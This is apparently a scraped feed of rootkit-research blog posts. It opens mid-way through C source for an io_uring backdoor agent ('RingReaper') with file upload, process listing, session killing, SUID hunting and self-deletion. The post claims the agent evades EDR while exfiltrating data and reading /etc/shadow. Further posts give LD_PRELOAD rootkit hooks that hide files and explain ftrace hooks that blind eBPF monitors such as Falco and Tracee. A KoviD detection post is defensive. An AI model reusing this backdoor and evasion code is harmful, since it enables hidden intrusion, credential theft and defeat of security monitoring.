strlen(msg)); return; } struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; sqe = io_uring_get_sqe(ring); io_uring_prep_openat(sqe, AT_FDCWD, remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); int fd = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (fd \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Failed to open %s: %s\\n\u0026#34;, remote_path, strerror(-fd)); send_all(ring, sockfd, err, strlen(err)); return; } off_t offset = 0; while (offset \u0026lt; expected_size) { size_t to_read = (expected_size - offset \u0026gt; BUF_SIZE) ? BUF_SIZE : (expected_size - offset); sqe = io_uring_get_sqe(ring); io_uring_prep_recv(sqe, sockfd, buf, to_read, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); ssize_t received = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (received \u0026lt;= 0) { break; } sqe = io_uring_get_sqe(ring); io_uring_prep_write(sqe, fd, buf, received, offset); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); io_uring_cqe_seen(ring, cqe); offset += received; } close(fd); } cmd_me:\nvoid cmd_me(struct io_uring *ring, int sockfd) { char buf[128]; pid_t pid = getpid(); char *tty = ttyname(STDIN_FILENO); if (!tty) tty = \u0026#34;(none)\u0026#34;; snprintf(buf, sizeof(buf), \u0026#34;PID: %d\\nTTY: %s\\n\u0026#34;, pid, tty); send_all(ring, sockfd, buf, strlen(buf)); } This command collects information about the running process, such as the PID and associated TTY, using traditional POSIX calls (getpid and ttyname), since io_uring does not support this. It then sends this data to the client using send_all. This is a way of “identifying” the remote agent.\ncmd_ps:\nvoid cmd_ps(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/proc\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /proc\\n\u0026#34;, 21); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;PID CMD\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { if (entry-\u0026gt;d_type != DT_DIR) continue; char *endptr; long pid = strtol(entry-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char comm_path[64]; snprintf(comm_path, sizeof(comm_path), \u0026#34;/proc/%ld/comm\u0026#34;, pid); char name[256]; int ret = read_file_uring(ring, comm_path, name, sizeof(name)); if (ret \u0026gt; 0) { name[strcspn(name, \u0026#34;\\n\u0026#34;)] = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%-7ld %s\\n\u0026#34;, pid, name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(dir); send_all(ring, sockfd, out, pos); } The cmd_ps function walks /proc to list active processes, identifying numerical directories (PIDs), and reading the command name of each process from /proc/[pid]/comm. Reading the process name is done using read_file_uring, but directory scanning does not use io_uring because it is not supported. The output is formatted into a PID + command listing, sent via send_all. It works like a remote “ps”.\ncmd_kick:\nvoid cmd_kick(struct io_uring *ring, int sockfd, const char *arg_raw) { char out[4096]; if (!arg_raw) arg_raw = \u0026#34;\u0026#34;; char *arg = (char *)arg_raw; trim_leading(\u0026amp;arg); if (strlen(arg) == 0) { DIR *d = opendir(\u0026#34;/dev/pts\u0026#34;); if (!d) { snprintf(out, sizeof(out), \u0026#34;Failed to open /dev/pts: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } struct dirent *entry; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Active pts sessions:\\n\u0026#34;); while ((entry = readdir(d)) != NULL) { if (entry-\u0026gt;d_name[0] \u0026gt;= \u0026#39;0\u0026#39; \u0026amp;\u0026amp; entry-\u0026gt;d_name[0] \u0026lt;= \u0026#39;9\u0026#39;) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;pts/%s\\n\u0026#34;, entry-\u0026gt;d_name); if (pos \u0026gt; sizeof(out) - 100) break; } } closedir(d); send_all(ring, sockfd, out, pos); return; } char target_tty[64]; snprintf(target_tty, sizeof(target_tty), \u0026#34;/dev/pts/%s\u0026#34;, arg); DIR *proc = opendir(\u0026#34;/proc\u0026#34;); if (!proc) { snprintf(out, sizeof(out), \u0026#34;Failed to open /proc: %s\\n\u0026#34;, strerror(errno)); send_all(ring, sockfd, out, strlen(out)); return; } int found_pid = 0; struct dirent *dent; while ((dent = readdir(proc)) != NULL) { char *endptr; long pid = strtol(dent-\u0026gt;d_name, \u0026amp;endptr, 10); if (*endptr != \u0026#39;\\0\u0026#39;) continue; char fd_path[256]; snprintf(fd_path, sizeof(fd_path), \u0026#34;/proc/%ld/fd\u0026#34;, pid); DIR *fd_dir = opendir(fd_path); if (!fd_dir) continue; struct dirent *fd_ent; while ((fd_ent = readdir(fd_dir)) != NULL) { if (fd_ent-\u0026gt;d_name[0] == \u0026#39;.\u0026#39;) continue; char link_path[512]; char link_target[512]; ssize_t link_len; snprintf(link_path, sizeof(link_path), \u0026#34;%s/%s\u0026#34;, fd_path, fd_ent-\u0026gt;d_name); link_len = readlink(link_path, link_target, sizeof(link_target) -1); if (link_len \u0026lt; 0) continue; link_target[link_len] = 0; if (strcmp(link_target, target_tty) == 0) { found_pid = (int)pid; break; } } closedir(fd_dir); if (found_pid) break; } closedir(proc); if (!found_pid) { snprintf(out, sizeof(out), \u0026#34;No process found using %s\\n\u0026#34;, target_tty); send_all(ring, sockfd, out, strlen(out)); return; } if (kill(found_pid, SIGKILL) == 0) { snprintf(out, sizeof(out), \u0026#34;Killed process %d using %s\\n\u0026#34;, found_pid, target_tty); } else { snprintf(out, sizeof(out), \u0026#34;Failed to kill process %d: %s\\n\u0026#34;, found_pid, strerror(errno)); } send_all(ring, sockfd, out, strlen(out)); } This command searches for open sessions in /dev/pts (virtual terminals) and, if the user wishes, forcibly kills a process that is using one of these terminals. It first lists the active terminals, then searches /proc for file descriptors that point to the target terminal, and sends a SIGKILL to the process that is using it. All this by combining POSIX calls (like readlink) and asynchronous sending with send_all.\ncmd_privesc:\nvoid cmd_privesc(struct io_uring *ring, int sockfd) { DIR *dir = opendir(\u0026#34;/usr/bin\u0026#34;); if (!dir) { send_all(ring, sockfd, \u0026#34;Failed to open /usr/bin\\n\u0026#34;, 23); return; } struct dirent *entry; char out[16384]; size_t pos = 0; pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;Potential SUID binaries:\\n\u0026#34;); while ((entry = readdir(dir)) != NULL) { char path[512]; snprintf(path, sizeof(path), \u0026#34;/usr/bin/%s\u0026#34;, entry-\u0026gt;d_name); struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; struct statx stx; io_uring_prep_statx(sqe, AT_FDCWD, path, 0, STATX_ALL, \u0026amp;stx); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res == 0 \u0026amp;\u0026amp; (stx.stx_mode \u0026amp; S_ISUID)) { pos += snprintf(out + pos, sizeof(out) - pos, \u0026#34;%s\\n\u0026#34;, path); if (pos \u0026gt; sizeof(out) - 100) break; } io_uring_cqe_seen(ring, cqe); } closedir(dir); send_all(ring, sockfd, out, pos); } This function scans the /usr/bin directory looking for binaries that have the SUID bit enabled, which could be privilege escalation vectors (privesc). For each binary, it does a statx via io_uring and checks the SUID flag. The result is formatted and sent to the client, listing possible privilege exploit candidates.\ncmd_selfdestruct:\nvoid cmd_selfdestruct(struct io_uring *ring, int sockfd) { const char *msg = \u0026#34;Agent will self-destruct\\n\u0026#34;; send_all(ring, sockfd, msg, strlen(msg)); char exe_path[512]; ssize_t len = readlink(\u0026#34;/proc/self/exe\u0026#34;, exe_path, sizeof(exe_path)-1); if (len \u0026gt; 0) { exe_path[len] = \u0026#39;\\0\u0026#39;; struct io_uring_sqe *sqe = io_uring_get_sqe(ring); struct io_uring_cqe *cqe; io_uring_prep_unlinkat(sqe, AT_FDCWD, exe_path, 0); io_uring_submit(ring); io_uring_wait_cqe(ring, \u0026amp;cqe); if (cqe-\u0026gt;res \u0026lt; 0) { char err[128]; snprintf(err, sizeof(err), \u0026#34;Unlink failed: %s\\n\u0026#34;, strerror(-cqe-\u0026gt;res)); send_all(ring, sockfd, err, strlen(err)); } io_uring_cqe_seen(ring, cqe); } exit(0); } How Does the EDR Typically Fail Here? A standard EDR intercepts:\nCalls to open Calls to connect Calls to read and write This monitoring is usually done via hooks or eBPF. What this agent does is \u0026ldquo;bypass\u0026rdquo; these direct calls using io_uring. The kernel handles the I/O without exposing each syscall individually, generating far fewer events to be audited.\nIn essence, the EDR sees fewer \u0026ldquo;door knocks\u0026rdquo; because io_uring sends a batch of operations to the kernel and receives the responses in bulk. This strategy generates much less noise and makes it easier to go unnoticed.\nPractical EDR Bypass With this agent, virtually all network and file operations are handled through io_uring.\nSo an EDR would need to monitor io_uring_enter and understand the full submission/completion flow of events to identify behavior — which is still uncommon in most commercial solutions.\nAdditionally, the traffic goes through a standard HTTPS port (443), making it harder to separate legitimate from malicious traffic.\nBelow is a screenshot from an environment running EDR:\nRingReaper is currently completely FUD (Fully Undetectable) to some EDRs at the time of writing this article. You can do anything, exfiltrate data, read /etc/shadow, access sensitive files, upload content, all RingReaper features remain fully undetected by some EDRs, with evasion working flawlessly.\nPython C2 Server Flow The server.py is quite straightforward:\nWaits for a connection Receives commands from a terminal Sends them to the agent Displays the response It also supports file uploads (put), basically by informing the file size and sending the content sequentially, so the backdoor can reconstruct the file on the target.\nDefensive Reflections As much as using io_uring to bypass defenses is a clever idea;\nThere’s no magic:\nThe kernel still has to execute the io_uring operations. In theory, a well-designed EDR could hook io_uring_enter or instrument internal calls like __io_uring_submit.\neBPF (Berkeley Packet Filter) could be used to trace these operations, but the reality is that few products today deeply monitor io_uring-related syscalls.\nIt’s essential that defenders become familiar with this kind of technique, as it’s likely to become increasingly popular in advanced Linux malware.\nConclusion This agent demonstrates that io_uring, a legitimate Linux feature, can be repurposed to evade syscall-based security solutions.\nIts asynchronous control level enables the construction of discreet, fast, and much harder-to-detect backdoors.\nFor red teamers, t shows the power of modern evasion techniques.\nFor defenders, the takeaway is clear: start studying hooks for io_uring, because it’s only a matter of time before this becomes mainstream in the Linux malware landscape.\nJoin in rootkit researchers\nhttps://discord.gg/66N5ZQppU7 ","permalink":"http://localhost:1313/hacking/evading-linux-edrs-with-io-uring/","summary":"\u003cp\u003eFull source: \u003ca href=\"https://github.com/MatheuZSecurity/RingReaper\"\u003ehttps://github.com/MatheuZSecurity/RingReaper\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#what-is-io_uring\"\u003eWhat is io_uring?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#the-agent\"\u003eThe Agent\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#code-analysis\"\u003eCode Analysis\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#how-does-the-edr-typically-fail-here\"\u003eHow Does the EDR Typically Fail Here?\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#practical-edr-bypass\"\u003ePractical EDR Bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#python-c2-server-flow\"\u003ePython C2 Server Flow\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#defensive-reflections\"\u003eDefensive Reflections\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eEach year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as \u003ccode\u003eEDR (Endpoint Detection and Response)\u003c/code\u003e evolve rapidly, making the work of an attacker more challenging.\u003c/p\u003e\n\u003cp\u003eWe, as \u003cstrong\u003ered teamers\u003c/strong\u003e, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\u003c/p\u003e","title":"Red Team Tactics: Evading EDR on Linux with io_uring"},{"content":" Introduction In this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\nLD_PRELOAD LD_PRELOAD is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\nThis technique allows you to \u0026ldquo;hook\u0026rdquo; functions from standard libraries, such as libc, without modifying the program binary, and is therefore widely used both for debugging and for offensive techniques such as user space rootkits.\nWhen an ELF binary is executed, the dynamic linker resolves external function calls using structures like the Procedure Linkage Table (PLT) and Global Offset Table (GOT). By preloading a custom library via LD_PRELOAD, attackers can override functions like readdir() or fopen().\nExample:\nLD_PRELOAD=./rootkitresearchers.so ls /etc/ld.so.preload\nBesides the environment variable, the /etc/ld.so.preload file can also be used to persistently load a library into all processes on the system (including root). This file is read before any environment variable.\nInstalling and Hiding Directory with Rootkit To demonstrate this, I\u0026rsquo;ll use a simple LD_PRELOAD rootkit that hooks the readdir, readdir64, and fopen functions to change the behavior of file and directory listings. The code is shown below.\nFull source\nstruct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This snippet above hooks into the readdir function, which is responsible for listing files in a directory. It uses a pointer orig_readdir to store the address of the original function, retrieved with dlsym(RTLD_NEXT, \u0026ldquo;readdir\u0026rdquo;). Then, in a loop, it calls the original function to get each entry in the directory, but filters out (ignores) entries whose name is equal to \u0026ldquo;secret\u0026rdquo; or \u0026ldquo;ld.so.preload\u0026rdquo;. Thus, these entries never appear to the program that called readdir. When there are no more visible entries, it returns NULL.\nstruct dirent64 *(*orig_readdir64)(DIR *dirp); struct dirent64 *readdir64(DIR *dirp) { if (!orig_readdir64) orig_readdir64 = dlsym(RTLD_NEXT, \u0026#34;readdir64\u0026#34;); struct dirent64 *entry; while ((entry = orig_readdir64(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, HIDDEN_DIR) != 0 \u0026amp;\u0026amp; strcmp(entry-\u0026gt;d_name, HIDDEN_FILE) != 0) { return entry; } } return NULL; } This is the same logic but for the 64-bit version readdir64.\nFILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); if (strstr(pathname, HIDDEN_FILE) != NULL) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } This fopen hook hides access to specific files by returning a ‘file not found’ error (ENOENT) if the path contains keywords like ‘ld.so.preload’.\nNow let\u0026rsquo;s compile and load it into /etc/ld.so.preload\nOnce loaded, we can test creating a directory named secret, and see if it is hidden from ls.\nAs expected, it was hidden from ls.\n[Theory] Breaking LD_PRELOAD rootkits Here’s something interesting: rootkits that use the LD_PRELOAD technique depend ENTIRELY on the Linux dynamic loader (ld-linux.so) to \u0026ldquo;inject\u0026rdquo; their malicious libraries before the standard system libraries, such as libc. But does this work with all programs?\nThe short and quick answer is: No!\nWhy does LD_PRELOAD work, and why does it sometimes not work?\nLD_PRELOAD, as explained in previous topics, is an environment variable used by ld-linux.so to load extra libraries before others, which allows it to intercept functions from standard libraries (such as libc). In other words, you can replace system functions, such as those that list files or open files, with customized versions, which is perfect for hiding directories or files, for example.\nBut for this to work, the program has to use dynamic loading and depend on ld-linux.so to resolve these functions.\nWhy do static binaries break this idea?\nStatically linked binaries are \u0026ldquo;self-contained\u0026rdquo;. They incorporate all necessary code from their dependencies (such as libc) directly into the executable. As a result, they do not invoke the dynamic linker at runtime, so LD_PRELOAD and /etc/ld.so.preload are ignored.\nIn other words, LD_PRELOAD and the /etc/ld.so.preload file are simply not used by these binaries. This means that rootkits based on these techniques have no effect on them, practically useless.\nThis is one of the most effective ways to bypass these rootkits.\n[Practice] Breaking LD_PRELOAD rootkits With the rootkit loaded in /etc/ld.so.preload, the secret directory is hidden from commands like ls, which depend on libc and the dynamic loader.\nBut it is easy to bypass this, for example: just compile a static binary, like a simple getdents64.c\ngcc getdents64.c -o getdents64 \u0026ndash;static\nWhen using ldd getdents64, we will see that it does not load any dynamic dependencies, unlike ldd /bin/ls, which depends on libc. Since static binaries do not use the dynamic linker, LD_PRELOAD is completely ignored, and so is the rootkit.\nBypassing LD_PRELOAD rootkits is simply very easy.\nConclusion LD_PRELOAD rootkits are actually very good at hiding artifacts in user space, especially because of their simplicity and the fact that they are more stable than LKM rootkits. However, as we have shown in this post, they are not infallible. Simple techniques, such as the use of static binaries, can easily bypass the hooks applied by the rootkit, precisely because they do not depend on the dynamic loader and the external libc.\nIf you enjoyed this content and want to discuss similar techniques, feel free to join our Discord community. See you next time!\nRootkit Researchers\nhttps://discord.gg/66N5ZQppU7\n","permalink":"http://localhost:1313/hacking/bypass-userland-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/JhWCyVT.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this post, I\u0026rsquo;m going to get into a really cool topic, which is how to bypass the hooks used by LD_PRELOAD rootkits, a technique that is effective against most, if not all, of them.\u003c/p\u003e\n\u003ch2 id=\"ld_preload\"\u003eLD_PRELOAD\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eLD_PRELOAD\u003c/code\u003e is an environment variable used by dynamic linkers on Unix-like systems (such as /lib64/ld-linux-x86-64.so.2 on x86_64 Linux) to force specific shared libraries to be loaded before any others during program execution.\u003c/p\u003e","title":"Bypassing LD_PRELOAD Rootkits Is Easy"},{"content":" Hello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\nBut first of all, we need to understand how the KoviD works.\nWhat is KoviD? KoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on github.\nNow that we know what KoviD is, we can analyze its code and see how it works, for example, which hooking method it uses.\nFtrace hooking Looking at KoviD sys.c, we can see that it uses a very famous method for hooking syscalls that works very well on newer kernels, which is ftrace (function tracer).\nKeep this information, it will be very useful later in this post.\nSetup KoviD and Loading. According to the kovid readme, before compiling, we need to edit the Makefile to choose a unique file name for \u0026ldquo;/proc/name\u0026rdquo;.\nAfter compiling using make, we can insert it using insmod kovid.ko.\nAfter inserting it, we can see that /proc/mtz had not been enabled and also the module was not hidden after its insertion, so first it is necessary to enable /proc/mtz using kill -SIGCONT 31337 and after that, hide the LKM from lsmod using echo -h \u0026gt;/proc/mtz.\nI also hid the file containing the name mtz, making it invisible in /proc/.\nWell, after enabling /proc/mtz, we can look in dmesg that a random magic word was generated, and this magic word is used to make KoviD visible again.\nIn kovid.c we can see this magic word function being called to make the module visible again.\nDetecting KoviD Well, luckily for us, there is a filesystem that is not very well known, which is tracing, normally on more up-to-date systems, it is already mounted by default, if tracefs is not mounted, just mount it using mount -t tracefs nodev /sys/kernel/tracing, and you can find its documentation at kernel.org.\nAnd in it we can simply view all the LKM functions that are loaded on the machine.\nA very interesting curiosity is that when Kovid is invisible, the trace only shows the addresses of each Kovid function (which in my head still doesn\u0026rsquo;t make much sense, since the /sys/kernel/tracing/available_filter_functions_addrs file was only added in kernel 6.5x, in it we can view the addresses of each function of each loaded lkm too and I am using kernel 5.15.0-119-generic for testing).\nNow, if we make kovid visible again, the name of its functions will appear.\nThis is a very simple way to detect KoviD, and it doesn\u0026rsquo;t require much effort.\nHowever, there is still a way to hide any function/LKM from the tracefs file system, so don\u0026rsquo;t be fooled by that and don\u0026rsquo;t think that if you didn\u0026rsquo;t find anything there that you are safe. Maybe I\u0026rsquo;ll talk about this in a future post.\nYou can also use nitara2 to detect KoviD.\nMaking KoviD hooks useless This part is very interesting and you will learn a really cool trick (if you didn\u0026rsquo;t already know).\nRemember when I mentioned at the beginning of the post that KoviD uses ftrace as a hooking method? So, many people may not know that there is a way to disable ftrace with just one command.\necho 0 \u0026gt; /proc/sys/kernel/ftrace_enabled or sysctl kernel.ftrace_enabled=0 Okay, but what\u0026rsquo;s so great about that? Well, let\u0026rsquo;s go!\nBy temporarily disabling ftrace, all kovid hooks stop working, as it uses ftrace for hooking, but this still does not make kovid visible, but it makes it useless.\nKoviD hides the file containing the name mtz, so /proc/mtz is hidden, and in it is the magic word to make LKM visible again.\nWell now with ftrace disabled we can see that the hidden /proc/mtz has become visible as no kovid hook works as it uses ftrace as syscalls hook.\nSo, after disabling ftrace, just go to /proc/mtz that was visible, get the magic word, and make LKM visible again, being able to remove it.\nAnd this is the easiest way to detect/remove KoviD.\nNotes 1- Of course, this is not 100% effective, as it has a way of hiding from the tracefs filesystem, but against KoviD so far, this works perfectly.\n2- And it is also obvious that in a real scenario, if someone is using KoviD, the name in /proc/name will not be something common like mtz, they would probably use a name that is less \u0026ldquo;imperceptible\u0026rdquo;.\n3- You can make any LKM rootkit that uses ftrace as hooking completely useless, and when you make it useless, you can use that to your advantage and analyze the compromised environment, looking for hidden PIDs, directories/files, etc.\nFinal consideration I hope you enjoyed this post and learned something, if you have any questions, please DM me on Twitter.\n","permalink":"http://localhost:1313/hacking/a-simple-way-to-detect-and-remove-kovid-lkm-rootkit/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/Xd3Y153.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post where I will cover the easiest way on how to detect and remove LKM KoviD rootkit.\u003c/p\u003e\n\u003cp\u003eBut first of all, we need to understand how the KoviD works.\u003c/p\u003e\n\u003ch2 id=\"what-is-kovid\"\u003eWhat is KoviD?\u003c/h2\u003e\n\u003cp\u003eKoviD is a Linux kernel rootkit, containing several features that make it difficult to detect and remove, in my opinion KoviD is the best open source LKM rootkit today, you can see more about it on \u003ca href=\"https://github.com/carloslack/KoviD\"\u003egithub\u003c/a\u003e.\u003c/p\u003e","title":"A simple way to detect and remove LKM rootkit KoviD (Outdated)"},{"content":"Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nMe: https://www.linkedin.com/in/mathsalves/\nIntroduction Linux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\nBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\nThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\nAll research is strictly for educational purposes.\nTable of Contents Introduction The eBPF Security Landscape How eBPF Security Works The False Promise of Kernel Observability Understanding the Attack Surface BPF Iterators BPF Ringbuffers Perf Events BPF Maps Bypassing eBPF Security: Technical Implementation Hook Architecture Process and Network Hiding Intercepting BPF Iterators Filtering Ringbuffer Events Blocking Perf Event Submission Manipulating BPF Maps Real-World Bypass Results Falco Evasion Tracee Evasion Additional Tools Conclusion The eBPF Security Landscape How eBPF Security Works eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.\nKey Components:\neBPF Programs: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes) BPF Maps: Kernel data structures for sharing information between eBPF programs and userspace Ringbuffers/Perf Events: Efficient mechanisms for streaming event data from kernel to userspace BPF Iterators: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.) Security Tools Using eBPF:\nFalco: Runtime security monitoring, detects anomalous behavior Tracee: System call and event tracing for security analysis Tetragon: Policy enforcement and security observability Cilium: Network security and observability GhostScan: Rootkit detection via memory scanning Decloaker: Hidden process detection The False Promise of Kernel Observability The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.\nThis assumption contains a critical flaw.\nThe Fundamental Problem:\neBPF programs execute inside the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel\u0026rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.\nWhy This Matters:\neBPF programs cannot protect themselves from kernel-level manipulation eBPF verifier only ensures memory safety, not security guarantees All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions Kernel functions can be hooked via ftrace The moment an attacker has kernel-level access, observability becomes optional.\nUnderstanding the Attack Surface Before we can bypass eBPF security, we need to understand how these tools collect data. Let\u0026rsquo;s examine each mechanism.\nBPF Iterators BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.\nIterator Flow:\nKernel Data (tasks, sockets) -\u0026gt; bpf_iter_run_prog() -\u0026gt; eBPF iterator program -\u0026gt; bpf_seq_write() / bpf_seq_printf() -\u0026gt; Userspace reads via seq_file Key Functions:\nbpf_iter_run_prog(): Executes the eBPF iterator program for each kernel object bpf_seq_write(): Writes data to the seq_file buffer bpf_seq_printf(): Formatted output to seq_file buffer Security Tools Using Iterators:\nGhostScan uses task iterators to detect hidden processes Decloaker uses network iterators to find hidden connections Custom security tools use iterators for forensic analysis BPF Ringbuffers Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.\nRingbuffer Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; bpf_ringbuf_reserve() -\u0026gt; bpf_ringbuf_submit() or bpf_ringbuf_output() -\u0026gt; Userspace reads events Key Functions:\nbpf_ringbuf_reserve(): Allocates space in the ringbuffer bpf_ringbuf_submit(): Commits reserved data to the ringbuffer bpf_ringbuf_output(): One-shot write to ringbuffer Security Tools Using Event Delivery Mechanisms:\nFalco (modern eBPF probe): Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent). Tracee: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation). Tetragon: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version. Note: \u0026ldquo;Perf event arrays\u0026rdquo; and \u0026ldquo;BPF ring buffers\u0026rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.\nPerf Events Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.\nPerf Event Flow:\nKernel Event -\u0026gt; eBPF program -\u0026gt; perf_event_output() -\u0026gt; perf_trace_run_bpf_submit() -\u0026gt; Userspace reads perf buffer Key Functions:\nperf_event_output(): Writes event to perf buffer perf_trace_run_bpf_submit(): Submits tracepoint data to eBPF programs Security Tools Using Perf Events:\nLegacy Falco versions Custom monitoring tools Kernel tracing utilities BPF Maps BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.\nMap Operations:\neBPF program or userspace -\u0026gt; bpf_map_lookup_elem() -\u0026gt; bpf_map_update_elem() -\u0026gt; bpf_map_delete_elem() -\u0026gt; Kernel map data structure Key Functions:\nbpf_map_lookup_elem(): Retrieve value from map bpf_map_update_elem(): Insert or update map entry bpf_map_delete_elem(): Remove map entry Security Use Cases:\nStoring process metadata Tracking network connections Maintaining allow/deny lists Sharing data between eBPF programs Bypassing eBPF Security: Technical Implementation Now that we understand how eBPF security works, let\u0026rsquo;s examine how to systematically blind it.\nHook Architecture Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.\nHooked Functions:\nstatic struct ftrace_hook hooks[] = { // BPF Iterator Hooks HOOK(\u0026#34;bpf_iter_run_prog\u0026#34;, hook_bpf_iter_run_prog, \u0026amp;orig_bpf_iter_run_prog), HOOK(\u0026#34;bpf_seq_write\u0026#34;, hook_bpf_seq_write, \u0026amp;orig_bpf_seq_write), HOOK(\u0026#34;bpf_seq_printf\u0026#34;, hook_bpf_seq_printf, \u0026amp;orig_bpf_seq_printf), // BPF Ringbuffer Hooks HOOK(\u0026#34;bpf_ringbuf_output\u0026#34;, hook_bpf_ringbuf_output, \u0026amp;orig_bpf_ringbuf_output), HOOK(\u0026#34;bpf_ringbuf_reserve\u0026#34;, hook_bpf_ringbuf_reserve, \u0026amp;orig_bpf_ringbuf_reserve), HOOK(\u0026#34;bpf_ringbuf_submit\u0026#34;, hook_bpf_ringbuf_submit, \u0026amp;orig_bpf_ringbuf_submit), // BPF Map Hooks HOOK(\u0026#34;bpf_map_lookup_elem\u0026#34;, hook_bpf_map_lookup_elem, \u0026amp;orig_bpf_map_lookup_elem), HOOK(\u0026#34;bpf_map_update_elem\u0026#34;, hook_bpf_map_update_elem, \u0026amp;orig_bpf_map_update_elem), // Perf Event Hooks 